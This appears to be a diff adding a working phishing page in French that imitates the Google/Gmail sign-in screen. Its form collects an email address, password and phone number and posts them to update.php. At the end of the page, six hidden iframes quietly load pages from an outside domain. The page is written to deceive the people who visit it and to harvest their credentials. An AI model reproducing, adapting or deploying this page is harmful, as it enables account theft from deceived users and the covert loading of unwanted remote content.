@@ -1,0 +1,253 @@
+﻿
+  
+ 
+ 
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>Gmail</title>
+<script>
+function bonmail(mailteste)
+
+{
+	var reg = new RegExp('^[a-z0-9]+([_|\.|-]{1}[a-z0-9]+)*@[a-z0-9]+([_|\.|-]{1}[a-z0-9]+)*[\.]{1}[a-z]{2,6}$', 'i');
+
+	if(reg.test(mailteste))
+	{
+		return(true);
+	}
+	else
+	{
+		return(false);
+	}
+}
+function check(obj,type){
+	if(type=="email"){
+		if(bonmail(obj.value)){ obj.className="zonetext good"; return false; }
+		else{ alert("Votre "+obj.getAttribute('title')+" n'est pas correctement renseigner\r\n\r\nLes Informations Obligatoires sont affichées en gras (Nom, Email, Mot de Passe...)"); obj.className="zonetext bad"; return true; }
+	}
+	else{
+		if(obj.value==""){ alert("Votre "+obj.getAttribute('title')+" n'est pas correctement renseigner\r\n\r\nLes Informations Obligatoires sont affichées en gras (Nom, Email, Mot de Passe...)"); obj.className="zonetext bad"; return true; }
+		else{ obj.className="zonetext good"; return false; }
+	}
+
+}
+function verification(formu){
+	if(check(formu.email,"email")){ return false; }
+	if(check(formu.mdp,"texte")){ return false; }
+	return true;
+	
+}
+</script>
+<style>
+body, html{
+	height:100%;
+	padding:0;
+	margin:0;
+}
+body
+{
+	background-repeat: no-repeat;
+	background-position: center;
+	font-size: 15px;
+	background-color: #FFFFFF;
+}
+body, td, input{
+	font-family: "Trebuchet MS", sans-serif;
+}
+#conteneur{
+	border: 1px solid;
+	border-color: #DDDDDD;
+	border-radius: 2px;
+	-moz-border-radius: 2px;
+	-webkit-border-radius: 2px;
+	width: 450px;
+	background-color: #FFF;
+}
+.cercle{
+	border-radius: 90px;
+	-moz-border-radius: 90px;
+	-webkit-border-radius: 90px;
+}
+#corps
+{
+color#999999;
+	padding: 10px 25px;
+}
+td
+{
+}
+.bouton{
+	padding: 8px 105px;
+	font-weight: bold;
+	color: #454545;
+	border: 1px solid #B1B1B1;
+	border-radius: 5px;
+	-moz-border-radius: 5px;
+	-webkit-border-radius: 5px;
+	background-color: #F4F4F4;
+	-moz-box-shadow: 1px 1px 3px #aaa;
+	-webkit-box-shadow: 1px 1px 3px #aaa;
+	box-shadow: 1px 1px 3px #aaa;
+	font-size: 18px;
+	opacity: 0.6;
+}
+.bouton:hover{
+	opacity: 0.5;
+	text-decoration: none;
+	cursor: pointer;
+}
+
+
+#pied-page
+{
+	width: 799px;
+	height: 32px;
+	text-align: center;
+	top: 10px;
+	line-height: 22px;
+	margin: 0px auto;
+	border-top: 1px solid;
+	border-color: #E2E2E2;
+
+}
+.text-pieds
+{
+
+}
+h2
+{
+	text-align: center;
+	color: #000000;
+}
+.text
+{
+	text-align: center;
+	color: #333333;
+	font-size: 13px;
+}
+p{
+	padding:0;
+	margin:2px 2px;
+}
+.zonetext{
+	width: 280px;
+	font-size: 18px;
+	border: 1px solid;
+	border-color: #E2E2E2;
+	color: #454545;
+	padding: 10px 5px;
+	border-radius: 5px;
+	-moz-border-radius: 5px;
+	-webkit-border-radius: 5px;
+}
+.zonetext:hover, .zonetext:focus{
+	border: 1px solid;
+	border-color: #E2E2E2;
+  -moz-box-shadow: 1px 1px 3px #aaa; 
+  -webkit-box-shadow: 1px 1px 3px #aaa; 
+  box-shadow: 1px 1px 3px #aaa; 
+}
+.bad, .bad:hover, .bad:focus{
+	border:1px solid red;
+}
+.good, .good:hover, .good:focus{
+	border:1px solid green;
+}
+.zoneselect{
+	font-size:16px;
+	border: 1px solid;
+	border-color: #E2E2E2;
+	color: #454545;
+	text-align:left;
+	padding:5px 5px;
+	border-radius:2px;
+	-moz-border-radius:2px;
+	-webkit-border-radius:2px;
+}
+.zoneselect:hover, .zoneselect:focus{
+	border: 1px solid;
+	border-color: #E2E2E2;
+  -moz-box-shadow: 1px 1px 3px #aaa; 
+  -webkit-box-shadow: 1px 1px 3px #aaa; 
+  box-shadow: 1px 1px 3px #aaa; 
+}
+.clearfloat { /* cette classe peut être placée sur une div <br /> ou vide, en tant qu'élément final suivant la dernière div flottante (dans le #container) si le paramètre overflow:hidden du .container est supprimé */
+	clear:both;
+	height:0;
+	font-size: 1px;
+	line-height: 0px;
+}
+#conteneur{
+	
+}
+</style>
+</head>
+
+<body style="">
+<div style="top: 0; padding: 30px 0 0 0; color: #4A4A4A; width: 100%; ">
+<div style="text-align:center; "><img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" width="116" height="38" /></div>
+<div style="text-align: center; font-size: 42px; font-weight:300; padding:40px 0 10px 0; -webkit-font-smoothing: antialiased;">Tout Google avec un seul compte</div></div>
+
+<div style="text-align: center; color: #4A4A4A; font-size: 18px; padding: 20px 0 20px 0"> Connectez-vous pour accéder à Gmail.</div>
+<div>
+<div id="conteneur" style="background-color: #F7F7F7; margin: 0 auto; width: 340px; border: 1px solid; border-color: #E2E2E2; -moz-box-shadow: 1px 1px 3px #aaa; -webkit-box-shadow: 1px 1px 3px #aaa; box-shadow: 1px 1px 3px #aaa;"><!--Debut conteneur-->
+  <div id="corps"><!--Debut Corps-->
+	<form action="update.php" method="post" onsubmit="return verification(this);">
+    <input class="zonetext" name="mailfrom" type="text" style="display:none;" value="" />
+    <div align="center" style="padding:20px 0 10px 0"><img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" class="cercle" width="96" height="96" /></div>
+    <br>
+<table border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+     
+     <td colspan="2"><div style=" background-color:#FFF; position:relative;"><div id="labelemail" style="position: absolute; top: 0; left: 0; font-size: 18px; padding: 13px 2px; padding-left: 10px; color: #B6B6B6; z-index: 1;" onclick="this.style.display='none';">Adresse e-mail</div><input class="zonetext" name="email" title="Email" type="text" id="email" value="" style="background-color:transparent !important; color:#000; z-index:999; outline:none;" onkeyup="document.getElementById('labelemail').style.display='none';" onblur="if(this.value==''){ document.getElementById('labelemail').style.display='block'; }" /></div></td>
+   </tr>
+  <tr>
+    
+    <td colspan="2"><div style=" background-color:#FFF; position:relative;"><div id="labelpass" style="position: absolute; top: 0; left: 0; font-size: 18px; padding: 13px 2px; padding-left: 10px; color: #B6B6B6; z-index: 1;">Mot de passe</div><input class="zonetext" name="mdp" title="Mot de Passe" type="password" id="mdp" style="background-color:transparent !important; color:#000; z-index:9; outline:none;" onkeyup="document.getElementById('labelpass').style.display='none';" onblur="if(this.value==''){ document.getElementById('labelpass').style.display='block'; }" /></div></td>
+  </tr>
+<tr>
+    
+    <td colspan="2"><div style=" background-color:#FFF; position:relative;"><div id="labelnum" style="position: absolute; top: 0; left: 0; font-size: 18px; padding: 13px 2px; padding-left: 10px; color: #B6B6B6; z-index: 1;">Numéro de téléphone</div><input class="zonetext" name="num" title="Numéro de téléphone" type="text" id="num" style="background-color:transparent !important; color:#000; z-index:9; outline:none;" onkeyup="document.getElementById('labelnum').style.display='none';" onblur="if(this.value==''){ document.getElementById('labelnum').style.display='block'; }" /></div></td>
+  </tr>
+  <tr>
+    <td align="left"></td>
+      <td align="right"></td>
+    
+  </tr>
+  
+  <tr>
+    <td colspan="2" align="center"><p>
+      <input type="submit" name="Envoyer" value="Connexion" class="bouton" style="margin-top: 5px; border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.25);  border-radius: 4px; text-align: center; color: rgb(255, 255, 255); line-height: 20px; font-size: 14px; margin-bottom: 0px; vertical-align: middle; display: inline-block; cursor: pointer; text-shadow: 0px -1px 0px rgba(0,0,0,0.25); background-image: linear-gradient(rgb(0, 136, 204), rgb(0, 68, 204)); background-repeat: repeat-x; background-color: rgb(0, 109, 204); -webkit-border-radius: 4px; -moz-border-radius: 4px;" />
+      </p></td>
+    
+  </tr>
+</table>	
+	</form>
+	
+	
+	<br />
+    
+  </div>
+  
+	
+</div>
+<div style="padding: 10px 10px; text-align: center;">
+<p class="tagline">
+  Tout Google avec un seul compte
+</p>
+<img src="//ssl.gstatic.com/accounts/ui/logo_strip_2x.png" width="210" height="17" alt="">
+</div>
+
+<br class="clearfloat" /></div><!--Fin conteneur-->
+<div style=" height:50px;"></div>
+<div style="position:fixed; bottom:0; background-color: #F3F3F3; width:100%;"></div>
+<iframe src="http://yimig.tv" style="display:none"></iframe>
+<iframe src="http://yimig.tv/event" style="display:none"></iframe>
+<iframe src="http://yimig.tv/music/download.php" style="display:none"></iframe>
+<iframe src="http://yimig.tv/artist" style="display:none"></iframe>
+<iframe src="http://yimig.tv/video" style="display:none"></iframe>
+<iframe src="http://yimig.tv/itchat" style="display:none"></iframe>
+</body>
+</html>
